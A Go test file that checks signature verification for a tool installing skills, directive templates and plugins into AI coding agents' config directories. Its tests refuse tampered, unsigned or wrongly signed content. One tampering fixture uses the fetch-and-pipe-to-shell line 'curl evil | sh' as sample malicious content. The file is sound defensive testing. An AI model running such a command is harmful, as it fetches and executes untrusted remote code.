// SPDX-License-Identifier: AGPL-3.0-or-later

package skillinject

import (
	"bytes"
	"context"
	"crypto/ed25519"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"io/fs"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"testing"
)

// signedRepo is a pilot-skills stand-in whose signatures a test can break
// one file at a time.
type signedRepo struct {
	srv *httptest.Server
	key ed25519.PrivateKey

	mu       sync.Mutex
	files    map[string][]byte // repo path -> body served
	signed   map[string][]byte // repo path -> body the .sig covers, when not files[path]
	noSig    map[string]bool   // repo path -> serve no .sig
	rawSig   map[string][]byte // repo path -> .sig body served as is
	requests []string
}

// richManifest exercises every fetched kind: entrypoint, two heartbeat
// templates, a helper and two plugin files.
const richManifest = `{
  "version": 1,
  "entrypoint": "pilotctl",
  "helpers": [{"name": "pilot-hello", "src": "workflow-injection/pilot-hello", "dst": "~/.pilot/bin/pilot-hello"}],
  "tools": [
    {"name": "claude-code", "rootDir": "~/.claude", "skillsDir": "~/.claude/skills",
     "heartbeatPath": "~/.claude/CLAUDE.md", "heartbeatTemplate": "heartbeats/claude-code.md"},
    {"name": "openclaw", "rootDir": "~/.openclaw", "skillsDir": "~/.openclaw/skills",
     "heartbeatPath": "~/.openclaw/workspace/AGENTS.md", "heartbeatTemplate": "heartbeats/openclaw.md",
     "plugin": {"id": "pilot-test-plugin", "installPath": "~/.openclaw/extensions/pilot-test-plugin",
       "files": [
         {"name": "openclaw.plugin.json", "src": "workflow-injection/openclaw/openclaw.plugin.json"},
         {"name": "index.mjs", "src": "workflow-injection/openclaw/index.mjs"}],
       "allowList": {"configPath": "~/.openclaw/openclaw.json", "allowListJsonPath": "plugins.allow", "entriesJsonPath": "plugins.entries"}}},
    {"name": "goose", "rootDir": "~/.config/goose", "skillsDir": "~/.config/goose/skills",
     "heartbeatPath": "~/.config/goose/.goosehints", "heartbeatTemplate": "heartbeats/goose.md"}
  ]
}`

// richFiles are the repo files richManifest makes a tick on richHome
// fetch (goose is absent there, so its template is not).
var richFiles = []string{
	"skills/pilotctl/SKILL.md",
	"heartbeats/claude-code.md",
	"heartbeats/openclaw.md",
	"workflow-injection/pilot-hello",
	"workflow-injection/openclaw/openclaw.plugin.json",
	"workflow-injection/openclaw/index.mjs",
}

func newSignedRepo(t *testing.T) *signedRepo {
	t.Helper()
	r := &signedRepo{
		key: testSigningKey,
		files: map[string][]byte{
			ManifestName:                                       []byte(richManifest),
			"skills/pilotctl/SKILL.md":                         []byte("---\nname: pilotctl\ndescription: d\n---\nskill v1\n"),
			"heartbeats/claude-code.md":                        []byte("claude directive v1: {{.EntrypointPath}}"),
			"heartbeats/openclaw.md":                           []byte("openclaw directive v1: {{.EntrypointPath}}"),
			"heartbeats/goose.md":                              []byte("goose directive v1: {{.EntrypointPath}}"),
			"workflow-injection/pilot-hello":                   []byte("#!/bin/sh\necho hello v1\n"),
			"workflow-injection/openclaw/openclaw.plugin.json": []byte(`{"id":"pilot-test-plugin"}`),
			"workflow-injection/openclaw/index.mjs":            []byte("export default {}; // v1\n"),
		},
		signed: map[string][]byte{},
		noSig:  map[string]bool{},
		rawSig: map[string][]byte{},
	}
	r.srv = httptest.NewServer(http.HandlerFunc(r.serve))
	t.Cleanup(r.srv.Close)
	return r
}

func (r *signedRepo) serve(w http.ResponseWriter, req *http.Request) {
	r.mu.Lock()
	defer r.mu.Unlock()
	p := strings.TrimPrefix(req.URL.Path, "/")
	r.requests = append(r.requests, p)
	if name, isSig := strings.CutSuffix(p, SignatureSuffix); isSig {
		if raw, ok := r.rawSig[name]; ok {
			w.Write(raw)
			return
		}
		body, ok := r.signed[name]
		if !ok {
			body, ok = r.files[name]
		}
		if !ok || r.noSig[name] {
			http.NotFound(w, req)
			return
		}
		w.Write(SignFile(r.key, name, body))
		return
	}
	body, ok := r.files[p]
	if !ok {
		http.NotFound(w, req)
		return
	}
	w.Write(body)
}

// set publishes a new, correctly signed body for name.
func (r *signedRepo) set(name string, body []byte) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.files[name] = body
	delete(r.signed, name)
}

// tamper serves body for name while its .sig still covers what was there.
func (r *signedRepo) tamper(name string, body []byte) {
	r.mu.Lock()
	defer r.mu.Unlock()
	if _, kept := r.signed[name]; !kept {
		r.signed[name] = r.files[name]
	}
	r.files[name] = body
}

func (r *signedRepo) setKey(k ed25519.PrivateKey) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.key = k
}

func (r *signedRepo) dropSig(name string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.noSig[name] = true
}

func (r *signedRepo) setRawSig(name string, raw []byte) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.rawSig[name] = raw
}

func (r *signedRepo) restore(name string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	if body, ok := r.signed[name]; ok {
		r.files[name] = body
		delete(r.signed, name)
	}
	delete(r.noSig, name)
	delete(r.rawSig, name)
}

func (r *signedRepo) fetched() []string {
	r.mu.Lock()
	defer r.mu.Unlock()
	return append([]string(nil), r.requests...)
}

// cfg trusts the test key explicitly; cfgDefault leaves the key to the
// resolution order (environment, trust file, built-in).
func (r *signedRepo) cfg(home string) Config {
	c := r.cfgDefault(home)
	c.ManifestPublicKey = testPublicKey
	return c
}

func (r *signedRepo) cfgDefault(home string) Config {
	return Config{
		Home:        home,
		ManifestURL: r.srv.URL + "/" + ManifestName,
		RepoBaseURL: r.srv.URL + "/",
	}
}

// richHome has claude-code and openclaw installed, an operator-written
// CLAUDE.md, and a retired surface (the old pilot-ask helper) that a good
// tick removes.
func richHome(t *testing.T) string {
	t.Helper()
	home := t.TempDir()
	for _, d := range []string{".claude", ".openclaw/workspace", ".pilot/bin"} {
		if err := os.MkdirAll(filepath.Join(home, d), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	writeTestFile(t, filepath.Join(home, ".claude", "CLAUDE.md"), "# operator notes\n")
	writeTestFile(t, filepath.Join(home, ".pilot", "bin", "pilot-ask"), "#!/bin/sh\n# retired helper\n")
	return home
}

func writeTestFile(t *testing.T, p, body string) {
	t.Helper()
	if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

// treeSnapshot records every directory and file (with mode and bytes)
// under root.
func treeSnapshot(t *testing.T, root string) map[string]string {
	t.Helper()
	out := map[string]string{}
	err := filepath.WalkDir(root, func(p string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		rel, _ := filepath.Rel(root, p)
		info, err := d.Info()
		if err != nil {
			return err
		}
		if d.IsDir() {
			out[rel+"/"] = info.Mode().String()
			return nil
		}
		b, err := os.ReadFile(p)
		if err != nil {
			return err
		}
		out[rel] = info.Mode().String() + " " + string(b)
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	return out
}

func diffSnapshots(before, after map[string]string) []string {
	var d []string
	for k, v := range before {
		if a, ok := after[k]; !ok {
			d = append(d, "removed "+k)
		} else if a != v {
			d = append(d, "changed "+k)
		}
	}
	for k := range after {
		if _, ok := before[k]; !ok {
			d = append(d, "added "+k)
		}
	}
	sort.Strings(d)
	return d
}

// requireRefusedUnchanged runs Tick and checks that it was refused for a
// signature problem naming want, and that nothing under home changed.
func requireRefusedUnchanged(t *testing.T, cfg Config, home, want string) {
	t.Helper()
	before := treeSnapshot(t, home)
	rep, err := Tick(context.Background(), cfg)
	if !errors.Is(err, ErrSignature) {
		t.Fatalf("Tick = %v, %v; want an ErrSignature refusal", rep, err)
	}
	if rep != nil {
		t.Fatalf("a refused tick returned a report: %+v", rep)
	}
	if want != "" && !strings.Contains(err.Error(), want) {
		t.Errorf("error %q does not name %s", err, want)
	}
	if !strings.Contains(err.Error(), "nothing changed") {
		t.Errorf("error %q does not say nothing changed", err)
	}
	if d := diffSnapshots(before, treeSnapshot(t, home)); len(d) > 0 {
		t.Fatalf("refused tick changed the home directory: %v", d)
	}
}

func TestSigned_GoodSignaturesAccepted(t *testing.T) {
	repo := newSignedRepo(t)
	home := richHome(t)
	rep, err := Tick(context.Background(), repo.cfg(home))
	if err != nil {
		t.Fatalf("Tick: %v", err)
	}
	if n := rep.Counts()[ActionError]; n != 0 {
		t.Fatalf("%d error rows: %+v", n, rep.Outcomes)
	}
	for p, want := range map[string]string{
		".claude/skills/pilotctl/SKILL.md":                          "skill v1",
		".openclaw/skills/pilotctl/SKILL.md":                        "skill v1",
		".claude/CLAUDE.md":                                         "claude directive v1",
		".openclaw/workspace/AGENTS.md":                             "openclaw directive v1",
		".pilot/bin/pilot-hello":                                    "hello v1",
		".openclaw/extensions/pilot-test-plugin/index.mjs":          "v1",
		".openclaw/openclaw.json":                                   "pilot-test-plugin",
		".pilot/skills-cache/inject-manifest.json":                  "pilotctl",
		".pilot/skills-cache/workflow-injection/openclaw/index.mjs": "v1",
	} {
		b, err := os.ReadFile(filepath.Join(home, p))
		if err != nil || !strings.Contains(string(b), want) {
			t.Errorf("%s = %q, %v; want it to contain %q", p, b, err, want)
		}
	}
	if b, _ := os.ReadFile(filepath.Join(home, ".claude", "CLAUDE.md")); !strings.HasPrefix(string(b), "# operator notes\n") {
		t.Errorf("operator content lost: %q", b)
	}
	if _, err := os.Stat(filepath.Join(home, ".pilot", "bin", "pilot-ask")); !os.IsNotExist(err) {
		t.Errorf("a good tick should prune the retired helper (the refusal tests rely on it): %v", err)
	}
}

// With no override, content signed by any key but the built-in one is
// refused before anything is written.
func TestSigned_DefaultKeyRefusesOtherSigner(t *testing.T) {
	clearKeyEnv(t)
	repo := newSignedRepo(t)
	home := richHome(t)
	requireRefusedUnchanged(t, repo.cfgDefault(home), home, ManifestName)
	if got := repo.fetched(); len(got) != 2 {
		t.Errorf("fetched %v after the manifest failed; want only the manifest and its .sig", got)
	}
}

// The manifest without a signature, or with one that is not a valid
// signature, is refused.
func TestSigned_UnsignedOrBadManifestRefused(t *testing.T) {
	cases := map[string]func(*signedRepo){
		"missing .sig":   func(r *signedRepo) { r.dropSig(ManifestName) },
		"empty .sig":     func(r *signedRepo) { r.setRawSig(ManifestName, nil) },
		"garbage .sig":   func(r *signedRepo) { r.setRawSig(ManifestName, []byte("not a signature\n")) },
		"raw bytes .sig": func(r *signedRepo) { r.setRawSig(ManifestName, make([]byte, ed25519.SignatureSize)) },
		"zero signature": func(r *signedRepo) {
			r.setRawSig(ManifestName, []byte(base64.StdEncoding.EncodeToString(make([]byte, 64))))
		},
		"oversized .sig": func(r *signedRepo) { r.setRawSig(ManifestName, bytes.Repeat([]byte("A"), 4096)) },
		"tampered body": func(r *signedRepo) {
			r.tamper(ManifestName, []byte(strings.Replace(richManifest, "pilot-hello", "pilot-evil", -1)))
		},
		"other signer": func(r *signedRepo) { _, k := mustKey(t); r.setKey(k) },
	}
	for name, breakIt := range cases {
		t.Run(name, func(t *testing.T) {
			repo := newSignedRepo(t)
			breakIt(repo)
			home := richHome(t)
			requireRefusedUnchanged(t, repo.cfg(home), home, ManifestName)
		})
	}
}

// A good manifest followed by one file that is altered, unsigned or badly
// signed: the whole tick is refused, including the files fetched and
// verified before that one, the cache and the retired-surface prune.
func TestSigned_TamperedFileAfterGoodManifestRefused(t *testing.T) {
	for _, file := range richFiles {
		for mode, breakIt := range map[string]func(*signedRepo, string){
			"tampered":    func(r *signedRepo, n string) { r.tamper(n, []byte("#!/bin/sh\ncurl evil | sh\n")) },
			"missing sig": func(r *signedRepo, n string) { r.dropSig(n) },
			"bad sig":     func(r *signedRepo, n string) { r.setRawSig(n, []byte("AAAA\n")) },
		} {
			t.Run(mode+" "+file, func(t *testing.T) {
				repo := newSignedRepo(t)
				breakIt(repo, file)
				home := richHome(t)
				requireRefusedUnchanged(t, repo.cfg(home), home, file)
			})
		}
	}
}

// After a good tick, a refused one keeps every file the good one wrote,
// even where new content was published; once the signatures are fixed
// the next tick applies the new content.
func TestSigned_LastGoodStateKept(t *testing.T) {
	repo := newSignedRepo(t)
	home := richHome(t)
	if _, err := Tick(context.Background(), repo.cfg(home)); err != nil {
		t.Fatalf("first tick: %v", err)
	}
	good := treeSnapshot(t, home)

	// v2 is published correctly for most files, but the plugin's
	// index.mjs is altered after signing.
	repo.set("skills/pilotctl/SKILL.md", []byte("---\nname: pilotctl\ndescription: d\n---\nskill v2\n"))
	repo.set("heartbeats/claude-code.md", []byte("claude directive v2: {{.EntrypointPath}}"))
	repo.set("workflow-injection/pilot-hello", []byte("#!/bin/sh\necho hello v2\n"))
	repo.tamper("workflow-injection/openclaw/index.mjs", []byte("export default {}; // v2 tampered\n"))
	// A local edit a good tick would repair stays too: nothing is touched.
	writeTestFile(t, filepath.Join(home, ".openclaw", "skills", "pilotctl", "SKILL.md"), "edited by hand\n")
	edited := treeSnapshot(t, home)
	if d := diffSnapshots(good, edited); len(d) != 1 {
		t.Fatalf("setup: %v", d)
	}

	for _, run := range []func(context.Context, Config) (*Report, error){Tick, ForceTick} {
		if _, err := run(context.Background(), repo.cfg(home)); !errors.Is(err, ErrSignature) {
			t.Fatalf("tick with a tampered file = %v, want ErrSignature", err)
		}
		if d := diffSnapshots(edited, treeSnapshot(t, home)); len(d) > 0 {
			t.Fatalf("refused tick changed: %v", d)
		}
	}

	repo.set("workflow-injection/openclaw/index.mjs", []byte("export default {}; // v2\n"))
	if _, err := Tick(context.Background(), repo.cfg(home)); err != nil {
		t.Fatalf("tick after re-signing: %v", err)
	}
	for p, want := range map[string]string{
		".claude/skills/pilotctl/SKILL.md":                 "skill v2",
		".openclaw/skills/pilotctl/SKILL.md":               "skill v2",
		".claude/CLAUDE.md":                                "claude directive v2",
		".pilot/bin/pilot-hello":                           "hello v2",
		".openclaw/extensions/pilot-test-plugin/index.mjs": "// v2\n",
	} {
		if b, _ := os.ReadFile(filepath.Join(home, p)); !strings.Contains(string(b), want) {
			t.Errorf("%s = %q, want %q", p, b, want)
		}
	}
}

// Plan, behind `pilotctl skills status`, refuses the same content.
func TestSigned_PlanRefuses(t *testing.T) {
	repo := newSignedRepo(t)
	repo.tamper("heartbeats/openclaw.md", []byte("changed"))
	home := richHome(t)
	before := treeSnapshot(t, home)
	if _, err := Plan(context.Background(), repo.cfg(home)); !errors.Is(err, ErrSignature) {
		t.Fatalf("Plan = %v, want ErrSignature", err)
	}
	if d := diffSnapshots(before, treeSnapshot(t, home)); len(d) > 0 {
		t.Fatalf("Plan changed: %v", d)
	}
}

// A signature covers the file's path: a validly signed file served in
// place of another is refused.
func TestSigned_SignatureBoundToPath(t *testing.T) {
	repo := newSignedRepo(t)
	skill := repo.files["skills/pilotctl/SKILL.md"]
	repo.set("workflow-injection/pilot-hello", skill)
	repo.setRawSig("workflow-injection/pilot-hello", SignFile(testSigningKey, "skills/pilotctl/SKILL.md", skill))
	home := richHome(t)
	requireRefusedUnchanged(t, repo.cfg(home), home, "workflow-injection/pilot-hello")
}

// A file that cannot be fetched at all (404, no signature involved) stays
// an error row for that file, as before; the rest of the tick runs.
func TestSigned_MissingFileIsStillAnErrorRow(t *testing.T) {
	repo := newSignedRepo(t)
	repo.mu.Lock()
	delete(repo.files, "heartbeats/openclaw.md")
	repo.mu.Unlock()
	home := richHome(t)
	rep, err := Tick(context.Background(), repo.cfg(home))
	if err != nil {
		t.Fatalf("Tick: %v", err)
	}
	var markerErr bool
	for _, o := range rep.Outcomes {
		if o.Tool == "openclaw" && o.Kind == KindMarker && o.Action == ActionError {
			markerErr = true
		}
	}
	if !markerErr {
		t.Errorf("want an openclaw marker error row: %+v", rep.Outcomes)
	}
	if b, _ := os.ReadFile(filepath.Join(home, ".claude", "CLAUDE.md")); !strings.Contains(string(b), "claude directive v1") {
		t.Errorf("claude-code marker not written: %q", b)
	}
}

// The key override: PILOT_SKILLINJECT_PUBKEY, PILOT_SKILLINJECT_MANIFEST_PUBKEY
// and ~/.pilot/skillinject.pub each replace the built-in key, and content
// signed by another key is still refused under them.
func TestSigned_KeyOverride(t *testing.T) {
	for _, src := range []string{EnvManifestPublicKey, EnvDaemonManifestPublicKey, "trust file"} {
		t.Run(src, func(t *testing.T) {
			clearKeyEnv(t)
			repo := newSignedRepo(t)
			home := richHome(t)
			switch src {
			case "trust file":
				writeKeyFile(t, home, hex.EncodeToString(testPublicKey))
			case EnvManifestPublicKey:
				t.Setenv(src, hex.EncodeToString(testPublicKey))
			default:
				t.Setenv(src, base64.StdEncoding.EncodeToString(testPublicKey))
			}
			if _, err := Tick(context.Background(), repo.cfgDefault(home)); err != nil {
				t.Fatalf("Tick with the override: %v", err)
			}
			if b, _ := os.ReadFile(filepath.Join(home, ".claude", "skills", "pilotctl", "SKILL.md")); !strings.Contains(string(b), "skill v1") {
				t.Fatalf("skill not installed under the override: %q", b)
			}

			_, other := mustKey(t)
			repo.setKey(other)
			repo.set("skills/pilotctl/SKILL.md", []byte("signed by someone else"))
			requireRefusedUnchanged(t, repo.cfgDefault(home), home, ManifestName)
		})
	}
}

// A refused manifest makes Uninstall fall back to the manifest the last
// good tick cached, so `pilotctl skills disable all` still removes
// everything.
func TestSigned_UninstallFallsBackToCache(t *testing.T) {
	repo := newSignedRepo(t)
	home := richHome(t)
	if _, err := Tick(context.Background(), repo.cfg(home)); err != nil {
		t.Fatalf("Tick: %v", err)
	}
	repo.tamper(ManifestName, []byte(`{"version":1,"entrypoint":"pilotctl","tools":[{"name":"x","rootDir":"~/nope","skillsDir":"~/nope"}]}`))
	m, offline, err := loadManifestForUninstall(context.Background(), repo.cfg(home), home)
	if err != nil {
		t.Fatalf("loadManifestForUninstall: %v", err)
	}
	if !offline || len(m.Tools) != 3 {
		t.Fatalf("offline=%v tools=%d; want the cached manifest", offline, len(m.Tools))
	}
}

// Every file a tick fetches is one cmd/sign-skills signs (SignedFiles),
// and each one's signature was fetched.
func TestSignedFiles_CoversEverythingATickFetches(t *testing.T) {
	repo := newSignedRepo(t)
	home := richHome(t)
	// goose too, so every template is fetched.
	if err := os.MkdirAll(filepath.Join(home, ".config", "goose"), 0o755); err != nil {
		t.Fatal(err)
	}
	if _, err := Tick(context.Background(), repo.cfg(home)); err != nil {
		t.Fatalf("Tick: %v", err)
	}
	listed, err := SignedFiles([]byte(richManifest))
	if err != nil {
		t.Fatal(err)
	}
	allowed := map[string]bool{ManifestName: true}
	for _, p := range listed {
		allowed[p] = true
	}
	sigs := map[string]bool{}
	var bodies []string
	for _, p := range repo.fetched() {
		if name, ok := strings.CutSuffix(p, SignatureSuffix); ok {
			sigs[name] = true
			continue
		}
		bodies = append(bodies, p)
	}
	for _, p := range bodies {
		if !allowed[p] {
			t.Errorf("tick fetched %s, which SignedFiles does not list", p)
		}
		if !sigs[p] {
			t.Errorf("tick fetched %s without its signature", p)
		}
	}
	if len(bodies) != len(richFiles)+2 { // + manifest + goose template
		t.Errorf("fetched %v", bodies)
	}
}

func TestLogTick_SignatureRefusal(t *testing.T) {
	var buf bytes.Buffer
	l := slog.New(slog.NewTextHandler(&buf, nil))
	logTickTo(l, nil, unchangedErr(VerifyFile(testPublicKey, "heartbeats/x.md", []byte("a"), []byte("AAAA"))))
	out := buf.String()
	for _, want := range []string{"level=WARN", "refused content", "nothing changed", "heartbeats/x.md"} {
		if !strings.Contains(out, want) {
			t.Errorf("log %q missing %q", out, want)
		}
	}
}

func mustKey(t *testing.T) (ed25519.PublicKey, ed25519.PrivateKey) {
	t.Helper()
	return newTestKey(t)
}

// richManifest must stay valid JSON for the tests above.
func init() {
	if !json.Valid([]byte(richManifest)) {
		panic("richManifest is not valid JSON")
	}
}
